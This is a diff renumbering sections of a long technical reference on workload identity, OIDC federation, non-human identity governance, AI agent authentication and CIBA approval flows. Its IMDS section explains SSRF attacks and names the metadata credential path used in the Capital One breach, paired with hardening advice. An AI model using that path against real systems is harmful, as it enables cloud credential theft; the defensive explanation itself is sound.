 **ECS Task Roles** — IAM roles assigned to ECS tasks via the task definition. Credentials are available through a task-local endpoint (`http://169.254.170.2/...`), separate from the EC2 IMDS.
 
-##### 23.6.3 GCP Workload Identity
+##### 24.6.3 GCP Workload Identity
 
 **Compute Engine default service account** — VMs automatically receive a service account with credentials available from the metadata server:
 
@@ -28628,7 +28630,7 @@ curl -X POST \
 
 This cross-cloud federation pattern enables workloads to access GCP APIs using their native AWS identity — no GCP service account key required. The same pattern works in reverse (GCP → AWS) and from Azure to either cloud.
 
-##### 23.6.4 Common Principle
+##### 24.6.4 Common Principle
 
 Across all three cloud providers, the pattern is identical:
 
@@ -28640,7 +28642,7 @@ Across all three cloud providers, the pattern is identical:
 
 This model eliminates the entire class of "leaked secret" vulnerabilities — there is no secret to leak. The security boundary shifts from "protect the secret" to "ensure the workload's IAM role follows least privilege."
 
-##### 23.6.5 Cross-Cloud Workload Identity
+##### 24.6.5 Cross-Cloud Workload Identity
 
 Organisations operating across multiple cloud providers face a fundamental challenge: each cloud has its own identity system (Entra ID, AWS IAM, GCP IAM), and there is no native cross-cloud identity federation. The common approaches and their trade-offs:
 
@@ -28657,7 +28659,7 @@ For organisations with a dominant cloud provider and a few satellite workloads, 
 #### 24.7 OIDC-Federated Workload Identity
 OIDC-federated workload identity extends the managed identity pattern across trust boundaries. The workload already possesses an OIDC token from its native platform (Kubernetes, GitHub Actions, Terraform Cloud) and **exchanges** it for credentials on a target platform — no static secrets involved.
 
-##### 23.7.1 The Federation Pattern
+##### 24.7.1 The Federation Pattern
 
 ```mermaid
 ---
@@ -28717,7 +28719,7 @@ The target platform validates the JWT's signature (using the source platform's O
 
 **No static credential — at any point in the flow — exists in the workload, the source platform, or the CI/CD configuration.**
 
-##### 23.7.2 Microsoft Entra Workload Identity Federation
+##### 24.7.2 Microsoft Entra Workload Identity Federation
 
 Configuration:
 1. Create an Entra ID app registration (or use a user-assigned managed identity)
@@ -28737,7 +28739,7 @@ grant_type=client_credentials
 
 Entra ID validates the external OIDC token's `iss` (issuer) and `sub` (subject) against the federated credential configuration. If valid → issues an Entra access token. The workload can then call Azure APIs (Key Vault, Storage, Resource Manager) using the Entra token.
 
-##### 23.7.3 AWS IAM OIDC Federation
+##### 24.7.3 AWS IAM OIDC Federation
 
 **EKS IRSA (IAM Roles for Service Accounts):**
 1. EKS creates an OIDC provider endpoint for the cluster
@@ -28763,7 +28765,7 @@ Entra ID validates the external OIDC token's `iss` (issuer) and `sub` (subject) 
 
 3. The Kubernetes service account token (projected volume) is exchanged for temporary AWS credentials via `sts:AssumeRoleWithWebIdentity`
 
-##### 23.7.4 GitHub Actions OIDC
+##### 24.7.4 GitHub Actions OIDC
 
 GitHub's OIDC provider (`https://token.actions.githubusercontent.com`) issues short-lived JWTs for every workflow run. Key claims:
 
@@ -29042,7 +29044,7 @@ Using the short-lived, scoped STS tokens, the runner accesses cloud resources (T
 
 
 
-##### 23.7.5 GCP Workload Identity Federation
+##### 24.7.5 GCP Workload Identity Federation
 
 GCP accepts external OIDC tokens from multiple sources — AWS, Azure, GitHub, and any OIDC-compliant identity provider — and exchanges them for GCP service account tokens via the Security Token Service (STS):
 
@@ -29164,13 +29166,13 @@ The cloud resource validates the access token (signature, expiry, scope) and pro
 #### 24.8 Cloud Instance Metadata Service (IMDS) Security
 The Instance Metadata Service (IMDS) — accessible at the link-local address `169.254.169.254` — is the mechanism by which cloud VMs and containers obtain credentials, instance metadata, user data, and network configuration. IMDS is the foundation of cloud-managed workload identity (§24.6), but it also represents a high-value attack target: any vulnerability that allows an attacker to reach IMDS from within a workload can compromise the workload's cloud credentials.
 
-##### 23.8.1 The SSRF Threat
+##### 24.8.1 The SSRF Threat
 
 **Server-Side Request Forgery (SSRF)** is the primary attack vector against IMDS. In an SSRF attack, the attacker exploits a vulnerability in a web application running on a cloud VM to trick the application into making an HTTP request to `http://169.254.169.254/...` — the IMDS endpoint. Because the request originates from within the VM, IMDS treats it as a legitimate local request and returns the VM's credentials.
 
 **Capital One breach (2019)** — The most consequential SSRF-to-IMDS attack in history. An attacker exploited an SSRF vulnerability in a misconfigured Web Application Firewall (WAF) running on an AWS EC2 instance. The attacker sent crafted requests that made the WAF forward requests to the AWS IMDS endpoint (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`). The WAF's IAM role had excessive permissions, granting access to over 700 S3 buckets. The attacker retrieved temporary IAM credentials from IMDS and used them to exfiltrate personal data of more than 100 million Capital One customers. The breach led to an $80 million fine and catalysed AWS's development of IMDSv2.
 
-##### 23.8.2 IMDS Security Across Cloud Providers
+##### 24.8.2 IMDS Security Across Cloud Providers
 
 | Property | AWS IMDSv1 | AWS IMDSv2 | Azure IMDS | GCP Metadata Server |
 |:---------|:----------|:----------|:-----------|:-------------------|
@@ -29195,7 +29197,7 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" \
 
 Typical SSRF vulnerabilities only allow the attacker to issue GET requests — they cannot perform the PUT required to obtain a session token. Additionally, IMDSv2 sets the HTTP response hop limit to 1 by default, preventing the token from being forwarded through proxies or containers. AWS recommends enforcing IMDSv2 and disabling IMDSv1 entirely.
 
-##### 23.8.3 IMDS Best Practices
+##### 24.8.3 IMDS Best Practices
 
 1. **Enforce IMDSv2 on all AWS instances** — Disable IMDSv1 entirely using the `HttpTokens: required` instance metadata option
 2. **Restrict IMDS access in containers** — Use Kubernetes network policies or iptables rules to block container access to `169.254.169.254` for workloads that don't need instance metadata
@@ -29270,7 +29272,7 @@ For detailed coverage of non-human identity lifecycle management, AI agent authe
 #### 24.11 Certificate Lifecycle Automation
 Certificate lifecycle management is a cross-cutting concern for mTLS (§24.2), SPIFFE/SPIRE (§24.3), and service mesh deployments (§24.4). Automated provisioning, renewal, and distribution eliminate the operational burden of manual certificate management and enable the short-lived certificate patterns that underpin modern zero-trust architectures.
 
-##### 23.11.1 cert-manager for Kubernetes
+##### 24.11.1 cert-manager for Kubernetes
 
 **cert-manager** is the de facto standard for certificate lifecycle management in Kubernetes. It automates certificate provisioning using the ACME protocol (RFC 8555) or internal CAs (HashiCorp Vault PKI, Venafi, self-signed). The core resources are:
 
@@ -29305,7 +29307,7 @@ spec:
 
 The `renewBefore` field triggers proactive renewal — cert-manager requests a new certificate 15 days before expiry, ensuring continuous coverage without manual intervention.
 
-##### 23.11.2 Short-Lived Certificate Patterns
+##### 24.11.2 Short-Lived Certificate Patterns
 
 The trend in M2M authentication is toward increasingly short certificate lifetimes. Each reduction in lifetime narrows the compromise window but increases the automation requirement:
 
@@ -29319,7 +29321,7 @@ The trend in M2M authentication is toward increasingly short certificate lifetim
 
 The relationship between certificate lifetime and detection probability can be expressed as $P(\text{detection}) = 1 - (1 - P(\text{per-unit detection}))^T$, where $T$ is the certificate lifetime. Shorter lifetimes reduce $T$, and attackers must continuously obtain new certificates to maintain access — creating repeated detection opportunities. Over a 24-hour attack window with hourly SPIFFE SVIDs and $P = 0.1$ per hour, cumulative detection probability reaches $1 - 0.9^{24} \approx 0.94$.
 
-##### 23.11.3 SPIFFE/SPIRE vs cert-manager
+##### 24.11.3 SPIFFE/SPIRE vs cert-manager
 
 SPIFFE/SPIRE and cert-manager serve overlapping but distinct roles:
 
@@ -29335,7 +29337,7 @@ SPIFFE/SPIRE and cert-manager serve overlapping but distinct roles:
 
 In practice, the tools are complementary: cert-manager handles ingress/egress certificates (public-facing TLS), while SPIFFE/SPIRE handles east-west mTLS between internal workloads.
 
-##### 23.11.4 Revocation Strategies
+##### 24.11.4 Revocation Strategies
 
 Certificate revocation becomes less critical as certificate lifetimes shorten, but remains important for handling compromise scenarios requiring immediate response:
 
@@ -29351,7 +29353,7 @@ For SPIFFE SVIDs with 1-hour lifetimes, explicit revocation is largely unnecessa
 #### 24.12 IoT and Constrained Device Authentication: ACE-OAuth and EDHOC
 DR-0003's §24 covers machine-to-machine authentication for enterprise workloads (service accounts, workload identity, certificate-based auth). This section addresses the specific challenge of authenticating constrained devices — IoT sensors, actuators, and edge controllers that have limited CPU, memory, and network bandwidth and cannot support the full TLS + OAuth 2.0 stack.
 
-##### 23.12.1 The Constrained Device Problem
+##### 24.12.1 The Constrained Device Problem
 
 A typical IoT sensor (e.g., a temperature monitor in a factory) operates under severe constraints:
 
@@ -29363,7 +29365,7 @@ A typical IoT sensor (e.g., a temperature monitor in a factory) operates under s
 
 Under these constraints, standard OAuth 2.0 flows are impractical: TLS 1.3 handshakes require ~15 KB of RAM and several round trips; JWT signature verification requires elliptic curve operations that take seconds on a constrained MCU; and the OAuth token endpoint's JSON payloads may exceed the device's memory budget.
 
-##### 23.12.2 ACE-OAuth (RFC 9200)
+##### 24.12.2 ACE-OAuth (RFC 9200)
 
 The Authentication and Authorization for Constrained Environments (ACE) framework (RFC 9200) adapts OAuth 2.0 for constrained devices by:
 
@@ -29397,7 +29399,7 @@ The Authentication and Authorization for Constrained Environments (ACE) framewor
    \{ temperature: 23.5, unit: "celsius", timestamp: 1718668800 \}
 ```
 
-##### 23.12.3 EDHOC (RFC 9528)
+##### 24.12.3 EDHOC (RFC 9528)
 
 The Ephemeral Diffie-Hellman Over COSE (EDHOC, RFC 9528) protocol provides authenticated key exchange for constrained devices. EDHOC is designed as a lightweight alternative to TLS 1.3's handshake:
 
@@ -29408,7 +29410,7 @@ The Ephemeral Diffie-Hellman Over COSE (EDHOC, RFC 9528) protocol provides authe
 
 **EDHOC in practice.** EDHOC is typically used to establish an OSCORE security context between a constrained device and a resource server. Once the OSCORE context is established, subsequent CoAP messages are encrypted and integrity-protected with minimal overhead (8 bytes per message for the OSCORE header).
 
-##### 23.12.4 When to Use ACE-OAuth vs. Standard OAuth
+##### 24.12.4 When to Use ACE-OAuth vs. Standard OAuth
 
 | Criterion | ACE-OAuth (RFC 9200) | Standard OAuth 2.0 |
 |:----------|:---------------------|:-------------------|
@@ -29449,7 +29451,7 @@ Yet NHIs receive a fraction of the security attention devoted to human identitie
 This chapter examines NHI governance from four angles: lifecycle management (§25.1), AI agent authentication patterns (§25.2), human-in-the-loop approval via CIBA (§25.3), and service account governance and bot identity (§25.4). For the underlying *technical mechanisms* of machine-to-machine authentication — OAuth 2.0 Client Credentials, mTLS, SPIFFE/SPIRE, managed identity, workload identity federation — see §24.
 
 #### 25.1 NHI Lifecycle: Provisioning, Rotation, Decommissioning
-##### 24.1.1 The NHI Scale Challenge
+##### 25.1.1 The NHI Scale Challenge
 
 The sheer volume of non-human identities makes manual governance impossible. Every component in a modern enterprise generates NHIs:
 
@@ -29466,7 +29468,7 @@ The sheer volume of non-human identities makes manual governance impossible. Eve
 
 CyberArk's 2025 Machine Identity Security Report found **82 machine identities per human identity** across surveyed enterprises, with 42% of organisations reporting that NHIs have access to sensitive data. Oasis Security's H1 2025 benchmark placed the ratio at **144:1** — the divergence reflecting different measurement methodologies (CyberArk counts active credentials; Oasis counts identity objects including dormant entries).
 
-##### 24.1.1a NHI Classification Taxonomy
+##### 25.1.2 NHI Classification Taxonomy
 
 NHIs are not a monolithic category. They span a wide range of identity types, each with distinct characteristics, credential formats, lifecycle patterns, and risk profiles. The following taxonomy classifies the nine primary NHI categories encountered in enterprise environments:
 
@@ -29502,7 +29504,7 @@ The following risk matrix provides a comparative assessment across all NHI categ
 | AI Agent Identities | HIGH | HIGH | MEDIUM | HIGH | HIGH | **Critical** |
 | RPA Bot Accounts | MEDIUM | MEDIUM | HIGH | MEDIUM | MEDIUM | **Medium** |
 
-##### 24.1.2 Provisioning Challenges
+##### 25.1.3 Provisioning Challenges
 
 NHI provisioning in most organisations follows a fundamentally different — and weaker — governance model than human identity provisioning:
 
@@ -29512,7 +29514,7 @@ NHI provisioning in most organisations follows a fundamentally different — and
 
 **Unclear ownership:** Human identities have a clear owner — the employee themselves, or their manager. NHI ownership is ambiguous: the developer who created the service account may have left the company months ago. The team that originally needed the SaaS integration may have been reorganised. The result is **orphaned NHIs** — active credentials with no accountable human owner.
 
-##### 24.1.2a The NHI Security Gap
+##### 25.1.4 The NHI Security Gap
 
 Human identity governance benefits from decades of tooling investment: HR-driven provisioning, periodic access certification campaigns, role-based access control (RBAC) enforcement, and multi-factor authentication (MFA) mandates. Non-human identities enjoy *none* of these safeguards by default — creating a systematic security gap that the OWASP Non-Human Identity Top 10 (2025) was specifically created to address:
 
@@ -29524,7 +29526,7 @@ Human identity governance benefits from decades of tooling investment: HR-driven
 
 This gap explains why OWASP NHI1:2025 (Improper Offboarding) ranks improper decommissioning as the #1 non-human identity risk — it is the direct consequence of having no lifecycle governance equivalent to the HR-driven processes that protect human accounts.
 
-##### 24.1.3 Secret Sprawl
+##### 25.1.5 Secret Sprawl
 
 NHI credentials proliferate uncontrollably across systems — a phenomenon known as **secret sprawl**. The fundamental challenge is that a single credential created in one location propagates to many others: a developer creates an API key in a cloud console, stores it in a secrets manager, copies it into a `.env` file for local testing, pastes it into a wiki for team reference, embeds it in a Terraform state file, and commits it to Git in a moment of urgency. Each copy represents an independent attack surface that must be tracked, rotated, and eventually revoked.
 
@@ -29585,7 +29587,7 @@ $$P(\text{secret in commit}) = 1 - (1 - p_s)^n$$
 
 where $p_s$ is the per-file probability of containing a secret (estimated at 0.03–0.05 for enterprise repos) and $n$ is the number of files changed in the commit. For a typical commit touching 5 files: $P \approx 1 - (1 - 0.04)^5 \approx 0.185$, or approximately 18.5%.
 
-##### 24.1.4 Rotation Strategies
+##### 25.1.6 Rotation Strategies
 
 Secret rotation — the periodic replacement of NHI credentials with fresh values — is both critical and operationally challenging:
 
@@ -29699,7 +29701,7 @@ The most secure pattern eliminates secrets entirely, using short-lived, dynamica
 | **4. Workload identity adoption** | Months 9–18 | Migrate cloud workloads to platform-native workload identity (Azure Managed Identity, AWS IRSA, GCP Workload Identity Federation). Replace secrets-manager lookups with IMDS token acquisition. Retain secrets manager as fallback for legacy applications. |
 | **5. Federation and zero-secret** | Months 18–24 | Implement cross-platform federation (SPIFFE/SPIRE for Kubernetes, OIDC federation for CI/CD). Eliminate remaining static secrets. Target: 95%+ of NHI authentications use short-lived, dynamically issued tokens. |
 
-##### 24.1.5 Decommissioning and Orphaned NHIs
+##### 25.1.7 Decommissioning and Orphaned NHIs
 
 Orphaned NHIs — active credentials whose creating developer has left, whose consuming service has been decommissioned, or whose original purpose has been forgotten — are among the highest-risk identity artifacts in any enterprise:
 
@@ -29715,7 +29717,7 @@ Orphaned NHIs — active credentials whose creating developer has left, whose co
 3. **Credential expiration enforcement** — all secrets and certificates should have maximum lifetimes (e.g., 90 days for client secrets, 1 year for certificates). The platform refuses to issue non-expiring credentials
 4. **Integration with HR/ITSM lifecycle** — when a human employee is offboarded, all NHIs they created or own should be surfaced for review and reassignment or decommissioning
 
-##### 24.1.6 NHI Lifecycle State Diagram
+##### 25.1.8 NHI Lifecycle State Diagram
 
 The following diagram illustrates the complete lifecycle of a non-human identity — from provisioning request through active use, rotation, potential suspension, and eventual decommissioning:
 
@@ -29772,7 +29774,7 @@ flowchart TD
     style H text-align:left
 ```
 
-##### 24.1.7 OWASP Non-Human Identity Top 10 (2025)
+##### 25.1.9 OWASP Non-Human Identity Top 10 (2025)
 
 The OWASP NHI Top 10 provides a structured threat taxonomy for non-human identity security. The full list:
 
@@ -29803,7 +29805,7 @@ NHIs exist across the organisation without centralised visibility — no compreh
 <details>
 <summary><strong>NHI2:2025 — Secret Leakage (expanded analysis)</strong></summary>
 
-NHI credentials stored in code repositories, configuration files, and version-controlled artifacts. Once committed, secrets persist in Git history even after removal — creating a permanent attack surface. See §25.1.3 for the comprehensive secret sprawl location table.
+NHI credentials stored in code repositories, configuration files, and version-controlled artifacts. Once committed, secrets persist in Git history even after removal — creating a permanent attack surface. See §25.1.5 for the comprehensive secret sprawl location table.
 
 **Detection techniques:** Continuous Git scanning with GitGuardian (commercial) or GitLeaks/TruffleHog (open source); pre-commit hooks (detect-secrets, gitleaks) to prevent secret introduction; pre-receive hooks on Git servers to enforce scanning on all pushes (preventing `--no-verify` bypass); GitHub Advanced Security secret scanning.
 
@@ -29862,7 +29864,7 @@ NHI credentials created once and never rotated. Long-lived static secrets accumu
 
 **Detection techniques:** Secrets manager audit (query all secrets, check rotation status, last rotation date, expiration dates); cloud IAM credential age (list all IAM access keys, flag keys older than the rotation policy threshold, typically 90 days); certificate expiration monitoring for TLS certificates, SSH keys, and code-signing certificates.
 
-**Mitigation strategies:** Implement automatic rotation for all secrets-manager-stored credentials (see rotation patterns in §25.1.4); set maximum credential lifetimes at the platform level (e.g., Azure AD certificate expiration enforcement, AWS IAM access key age policy via SCP); for credentials that cannot be automatically rotated (third-party API keys with no rotation API), implement calendar-based reminders and manual rotation workflows with SLA.
+**Mitigation strategies:** Implement automatic rotation for all secrets-manager-stored credentials (see rotation patterns in §25.1.6); set maximum credential lifetimes at the platform level (e.g., Azure AD certificate expiration enforcement, AWS IAM access key age policy via SCP); for credentials that cannot be automatically rotated (third-party API keys with no rotation API), implement calendar-based reminders and manual rotation workflows with SLA.
 
 </details>
 
@@ -29899,7 +29901,7 @@ Developers using service accounts for interactive tasks — logging into a datab
 
 </details>
 
-##### 24.1.8 Emerging NHI Security Vendors
+##### 25.1.10 Emerging NHI Security Vendors
 
 A new category of security vendors has emerged specifically to address NHI lifecycle management — distinct from traditional IAM (which focuses on human identities) and PAM (which focuses on privileged access):
 
@@ -29910,7 +29912,7 @@ A new category of security vendors has emerged specifically to address NHI lifec
 - **Entro Security** — NHI lifecycle management with secrets discovery, ownership attribution, and automated rotation
 
 #### 25.2 AI Agent Authentication (User Delegation, Service Principal, Managed Identity)
-##### 24.2.1 The AI Agent Identity Challenge
+##### 25.2.1 The AI Agent Identity Challenge
 
 AI agents — LLM-based assistants, autonomous coding agents, agentic RAG workflows, and multi-agent orchestration systems — represent a new class of non-human identity with characteristics that differ fundamentally from traditional service accounts:
 
@@ -29924,7 +29926,7 @@ AI agents — LLM-based assistants, autonomous coding agents, agentic RAG workfl
 
 The fundamental question for AI agent authentication is: **whose authority does the agent exercise?** This determines which authentication model applies.
 
-##### 24.2.2 Three Authentication Models for AI Agents
+##### 25.2.2 Three Authentication Models for AI Agents
 
 ```mermaid
 ---
@@ -29986,7 +29988,7 @@ The AI agent runs as a cloud workload with a managed identity (§24.6) — the c
 - **Audit trail:** API calls attributed to the managed identity's object ID — traceable to the specific workload
 - **Risks:** Over-provisioning of RBAC roles. IMDS security (§24.8) — if the compute environment is compromised, the attacker can obtain the managed identity token
 
-##### 24.2.3 AI Agent Authentication Model Comparison
+##### 25.2.3 AI Agent Authentication Model Comparison
 
 | Dimension | User Delegation | Service Principal | Managed Identity |
 |:----------|:---------------|:-----------------|:----------------|
@@ -29999,7 +30001,7 @@ The AI agent runs as a cloud workload with a managed identity (§24.6) — the c
 | **Suitable for** | Interactive assistants, user-facing Copilots, email/calendar agents | Autonomous pipelines, batch processing, scheduled tasks | Cloud-native agents, platform-integrated AI services |
 | **Human accountability** | ✅ Clear — delegating user is recorded | ⚠️ Weak — no individual human in the loop | ⚠️ Weak — accountability maps to workload, not person |
 
-##### 24.2.3a Permission Boundary Models
+##### 25.2.4 Permission Boundary Models
 
 Beyond the choice of authentication model, AI agents require carefully scoped *permission boundaries* that balance operational capability with security. Two primary models exist:
 
@@ -30009,7 +30011,7 @@ Beyond the choice of authentication model, AI agents require carefully scoped *p
 
 The task-scoped model is strongly preferred for AI agents operating on sensitive resources, as it minimises the blast radius of both compromise and misconfiguration.
 
-##### 24.2.4 Least Privilege for AI Agents
+##### 25.2.5 Least Privilege for AI Agents
 
 AI agents amplify the risk of over-privileged identities because they operate at machine speed with potentially unbounded scope:
 
@@ -30028,12 +30030,12 @@ AI agents amplify the risk of over-privileged identities because they operate at
 
 Implementing least privilege for LLM-powered agents introduces challenges that do not exist for traditional service accounts:
 
-1. **Unpredictable tool use.** LLM agents decide at runtime which tools (and thus which API permissions) they need. The set of tools the agent might invoke depends on the user's prompt, which is not known in advance. Pre-assigning permissions requires anticipating all possible tool invocations — task-scoped permission models (§25.2.3a) address this by evaluating permissions per task rather than per session.
-2. **Chain-of-thought permission reasoning.** Advanced agents reason about what permissions they need as part of their decision-making process. This reasoning can be audited and validated, but it requires logging not just the API calls but also the agent's reasoning chain that led to each call — see §25.2.5.
+1. **Unpredictable tool use.** LLM agents decide at runtime which tools (and thus which API permissions) they need. The set of tools the agent might invoke depends on the user's prompt, which is not known in advance. Pre-assigning permissions requires anticipating all possible tool invocations — task-scoped permission models (§25.2.4) address this by evaluating permissions per task rather than per session.
+2. **Chain-of-thought permission reasoning.** Advanced agents reason about what permissions they need as part of their decision-making process. This reasoning can be audited and validated, but it requires logging not just the API calls but also the agent's reasoning chain that led to each call — see §25.2.6.
 3. **Human-in-the-loop for sensitive operations.** For high-impact operations (deployment, deletion, financial transactions, data export), the agent should request human approval before proceeding. This requires integrating the agent's execution framework with a CIBA-based approval flow (§25.3).
 4. **Just-in-time permission elevation.** The agent should operate with minimal permissions by default and request elevation only when needed — analogous to just-in-time (JIT) access for human accounts. The elevation request should include the agent's reasoning for why the additional permission is needed, enabling the approval authority to make an informed decision.
 
-##### 24.2.5 AI Agent Audit Trail Requirements
+##### 25.2.6 AI Agent Audit Trail Requirements
 
 Every action taken by an AI agent must produce an audit record containing:
 
@@ -30065,13 +30067,13 @@ The following table defines the recommended audit log schema for AI agent action
 This enriched audit trail enables post-incident forensics (what did the compromised agent do?), compliance reporting (which agents accessed regulated data?), and accountability mapping (which human authorised the agent's sensitive operations?).
 
 #### 25.3 Human-in-the-Loop Approval via CIBA
-##### 24.3.1 The Problem: Autonomous Agents Need Human Approval
+##### 25.3.1 The Problem: Autonomous Agents Need Human Approval
 
 AI agents operating with delegated or application-level permissions may need human approval before performing sensitive or irreversible actions — deploying to production, transferring funds, deleting resources, or accessing confidential data. The challenge: the human approver is typically *not present at the agent's interface*. The agent runs in a background workflow, a CI/CD pipeline, or a server-side process — there is no browser to redirect the user to, and no login page to display.
 
 This is precisely the scenario that **CIBA (Client Initiated Backchannel Authentication)** was designed for.
 
-##### 24.3.2 CIBA Protocol Overview
+##### 25.3.2 CIBA Protocol Overview
 
 CIBA — defined in the OpenID Connect Client Initiated Backchannel Authentication Flow Core 1.0 specification (approved September 2021, OpenID Foundation) — enables a client application to initiate user authentication *without any direct interaction on the consumption device*. The user authenticates on a separate, pre-registered **authentication device** (typically a smartphone), and the client receives tokens after the user completes the authentication and consent flow.
 
@@ -30248,7 +30250,7 @@ Once the user has approved, the OP's response to the agent's poll request contai
 
 </details>
 
-##### 24.3.3 CIBA Response Modes
+##### 25.3.3 CIBA Response Modes
 
 CIBA defines three mechanisms for delivering the authentication result to the client:
 
@@ -30266,7 +30268,7 @@ CIBA defines three mechanisms for delivering the authentication result to the cl
 
 The response mode is configured during **client registration** — not per-request. A given CIBA client operates in exactly one mode.
 
-##### 24.3.4 CIBA vs. Device Authorization Grant (RFC 8628)
+##### 25.3.4 CIBA vs. Device Authorization Grant (RFC 8628)
 
 Both CIBA and the Device Authorization Grant enable decoupled authentication — the consuming device and the authenticating device are separate. The critical distinction:
 
@@ -30285,7 +30287,7 @@ Both CIBA and the Device Authorization Grant enable decoupled authentication —
 - **CIBA** → the AI agent knows *which user* needs to approve. The agent sends a targeted approval request to that specific user's device. Example: a financial AI agent needs Jane's approval before transferring > $10,000
 - **Device Authorization Grant** → the device doesn't know *who* will authenticate. It displays a code and waits for *someone* to complete the flow. Example: a CLI tool asking "log in by visiting https://login.example.com and entering code ABCD-1234"
 
-##### 24.3.5 CIBA Use Cases for AI Agents
+##### 25.3.5 CIBA Use Cases for AI Agents
 
 CIBA's architecture maps directly to AI agent approval patterns:
 
@@ -30294,7 +30296,7 @@ CIBA's architecture maps directly to AI agent approval patterns:
 3. **Data access consent** — an AI research agent needs access to a confidential dataset. The agent sends a CIBA request to the data owner: `binding_message="Access Project Aurora dataset for Q4 analysis?"`
 4. **Escalation in multi-agent workflows** — in an agentic workflow where a primary agent delegates tasks to sub-agents, a sub-agent encounters a decision that exceeds its autonomous authority. The sub-agent triggers a CIBA request to a human supervisor
 
-##### 24.3.5a Binding Message Security
+##### 25.3.6 Binding Message Security
 
 The `binding_message` parameter is the primary human-facing security control in CIBA — it tells the user *what* they are approving. Its security properties are critical for preventing approval manipulation:
 
@@ -30303,7 +30305,7 @@ The `binding_message` parameter is the primary human-facing security control in 
 3. **Truncation risk.** The user's authentication device has limited display space (watch, phone notification). Long binding messages may be truncated, hiding critical details. The binding message should lead with the most important information (action and amount/resource) and stay within 40–80 characters.
 4. **Social engineering resistance.** Attackers could craft binding messages that mimic legitimate approval requests. The `user_code` parameter provides a second factor — the user must enter the code from a different channel (e.g., displayed in the agent's chat interface, sent via email), preventing accidental approval of a push notification.
 
-##### 24.3.5b FAPI-CIBA Profile
+##### 25.3.7 FAPI-CIBA Profile
 
 The OpenID Financial Services (FAPI) Advanced profile adds security requirements on top of base CIBA for financial use cases:
 
@@ -30313,7 +30315,7 @@ The OpenID Financial Services (FAPI) Advanced profile adds security requirements
 4. **PAR (Pushed Authorization Requests):** The backchannel authentication request must be sent via a pushed authorization request endpoint, preventing parameter tampering
 5. **Refresh token rotation:** If refresh tokens are issued, they must be rotated on each use (one-time-use refresh tokens)
 
-##### 24.3.5c CIBA Implementation Status Across IdPs
+##### 25.3.8 CIBA Implementation Status Across IdPs
 
 | Provider | CIBA Support | FAPI-CIBA Profile | Response Modes | Notes |
 |:---------|:------------:|:------------------:|:--------------:|:------|
@@ -30326,7 +30328,7 @@ The OpenID Financial Services (FAPI) Advanced profile adds security requirements
 | **WSO2** | YES | YES | Poll, Push | Open-source; FAPI 2.0 compliance certified by OpenID Foundation |
 
 #### 25.4 Service Account Governance and Bot Identity
-##### 24.4.1 Service Account Anti-Patterns
+##### 25.4.1 Service Account Anti-Patterns
 
 Service accounts — the most common NHI type in enterprise environments — suffer from a consistent set of governance failures:
 
@@ -30339,7 +30341,7 @@ Service accounts — the most common NHI type in enterprise environments — suf
 | **No rotation** | Service account credentials that have never been rotated since creation — some organisations have service account keys that are 5+ years old | Extended window of exposure. If the credential was ever leaked (even briefly), the attacker retains access indefinitely |
 | **Cross-environment reuse** | Same service account or credential used across development, staging, and production | Development environment compromise (lower security controls) grants access to production |
 
-##### 24.4.2 Governance Best Practices
+##### 25.4.2 Governance Best Practices
 
 **Ownership and accountability:**
 
@@ -30365,7 +30367,7 @@ Service accounts — the most common NHI type in enterprise environments — suf
 - NHI activity patterns are typically more predictable than human activity — a CI/CD service account authenticates from the same IP range, at the same times, accessing the same resources. Any deviation is a strong anomaly signal
 - Integrate NHI activity monitoring with SIEM/SOAR platforms for automated response (e.g., auto-suspend a service account that starts accessing resources it has never accessed before)
 
-##### 24.4.3 Bot Identity
+##### 25.4.3 Bot Identity
 
 Bots — chatbots, RPA (Robotic Process Automation) bots, workflow automation bots, and social media bots — are a distinct NHI category that bridges automated processing and user-facing interaction:
 
@@ -30448,7 +30450,7 @@ The chapter culminates in a comprehensive comparison matrix (§26.7) and a discu
 #### 26.1 CIAM: Customer Identity and Access Management
 CIAM serves **external users** — customers, prospects, citizens, patients, students, and any identity that exists outside the organisation's administrative boundary. The defining characteristics of CIAM are scale, self-service, privacy, and the primacy of user experience over security friction.
 
-##### 25.1.1 Scale
+##### 26.1.1 Scale
 
 CIAM systems operate at scales that dwarf workforce directories by three to five orders of magnitude:
 
@@ -30469,7 +30471,7 @@ These numbers impose architectural constraints that do not exist in workforce en
 
 The scale engineering implications are significant. CIAM platforms employ a stateless, horizontally scaled architecture where every authentication request can be served by any node in a geographically distributed cluster. This requires: **stateless authentication endpoints** with no server-side session state — all session information is encoded in JWTs or stored in a distributed cache (Redis, DynamoDB, ElastiCache) with short TTLs, allowing any frontend node to handle any request without sticky sessions; **multi-region geo-routing** via DNS-based latency routing (Route 53, Cloudflare geolocation) with 3–6 regional clusters, each maintaining its own cache layer while sharing a single source of truth through eventually-consistent replication; and **database sharding** by tenant ID or geographic region to distribute read/write load. JWKS endpoints and OpenID configuration documents are cached at CDN edges to avoid origin requests on every token validation. The result: CIAM targets 99.99% availability (52.6 min/year downtime) with near-zero RPO and seconds-level RTO via automatic failover — compared to WIAM targets of 99.9% (8.76 hrs/year) with minutes-to-hours RPO and manual failover.
 
-##### 25.1.2 Self-Service Registration
+##### 26.1.2 Self-Service Registration
 
 CIAM users create their own accounts. The organisation does not know who the user is until they self-identify — and even then, the identity may be pseudonymous, partially verified, or entirely fabricated. Registration flows must minimise friction while collecting enough information to establish a usable identity:
 
@@ -30477,7 +30479,7 @@ CIAM users create their own accounts. The organisation does not know who the use
 - **Social login** — "Sign in with Google / Apple / Facebook / Microsoft" — delegates authentication to a social identity provider via OAuth 2.0 + OpenID Connect (§3). The social provider handles credential management; the CIAM platform maps the external identity to a local account via the `sub` claim in the ID token. Social login can increase registration conversion by 20–40% by eliminating the password-creation step
 - **Identity proofing (optional)** — for regulated industries (banking, healthcare, government), the registration flow includes identity verification — government ID document scanning + liveness check (selfie matching) — to establish IAL2 assurance (§1). This is always opt-in or triggered at a later stage; no consumer service requires IAL2 at initial registration for general functionality
 
-##### 25.1.2a Conversion Economics
+##### 26.1.3 Conversion Economics
 
 The relationship between form complexity and abandonment is well-documented, with quantifiable economics:
 
@@ -30511,7 +30513,7 @@ xychart-beta
     line [94, 78, 42, 15]
 ```
 
-##### 25.1.3 Privacy-First Architecture
+##### 26.1.4 Privacy-First Architecture
 
 CIAM operates under a fundamentally different privacy regime than WIAM:
 
@@ -30528,7 +30530,7 @@ The legal basis for processing personal data in CIAM is typically **consent** (G
 
